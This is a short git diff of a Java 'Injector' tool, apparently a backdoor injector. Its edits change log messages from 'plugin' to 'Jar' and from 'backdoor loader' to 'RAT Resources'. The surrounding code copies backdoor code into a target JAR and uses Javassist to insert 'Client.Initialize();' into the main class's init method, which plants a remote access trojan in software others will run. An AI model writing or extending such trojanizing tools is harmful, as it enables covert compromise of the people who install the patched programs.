@@ -65,7 +65,7 @@ public class Injector {
         }
 
         if(!quiet) {
-            System.out.println("[Injector] Reading plugin data for file: " + input.getFileName());
+            System.out.println("[Injector] Reading data for file: " + input.getFileName());
             System.out.println(input.toAbsolutePath());
         }
 
@@ -74,7 +74,7 @@ public class Injector {
         String mainClass = (String) (config.MainClass);
 
         if(!quiet)
-            System.out.println("[Injector] Found plugin name: " + name + "\n[Injector] Found main class: " + mainClass);
+            System.out.println("[Injector] Found Jar name: " + name + "\n[Injector] Inputted main class: " + mainClass);
 
         /*--- Copy Backdoor Code ---*/
 
@@ -119,8 +119,8 @@ public class Injector {
 
         }catch(FileAlreadyExistsException e){
             if(!quiet) {
-                InjectorGUI.displayError("Plugin already patched.");
-                System.out.println("[Injector] Plugin already patched.");
+                InjectorGUI.displayError("Jar already Injected.");
+                System.out.println("[Injector] Jar already Injected.");
                 e.printStackTrace();
             }
 
@@ -151,13 +151,13 @@ public class Injector {
             //Get main class, and find onEnable method
 
             if(!quiet)
-                System.out.println("[Injector] Injecting backdoor loader into class.");
+                System.out.println("[Injector] Injecting RAT Resources into class.");
 
             CtClass cc = pool.get(mainClass);
             CtMethod m = cc.getDeclaredMethod("init");
 
             if(!quiet)
-                System.out.println("| Client.Initialize(); | Has Been Added");
+                System.out.println(" 'Client.Initialize();'  Has Been Added");
             m.insertAfter("Client.Initialize();");
 
             //Write to temporary file
